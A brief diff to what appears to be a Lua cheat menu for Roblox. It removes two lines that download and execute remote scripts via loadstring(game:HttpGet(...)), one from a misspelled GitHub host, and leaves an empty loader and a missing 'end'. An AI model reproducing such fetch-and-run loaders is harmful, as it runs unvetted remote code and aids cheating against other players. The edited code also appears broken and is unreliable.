@@ -50,8 +50,7 @@ Tab:AddButton({
 	Name = "kill gui (required touch damage tool)",
 	Callback = function()
 
-loadstring(game:HttpGet("https://raw.githubusercotent.com/0Ben1/fe./main/Spin%20hats"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Kill-gui/main/Kill"))()
-end
+loadstring(game:HttpGet(""))()
 })
 
 Tab:AddButton({
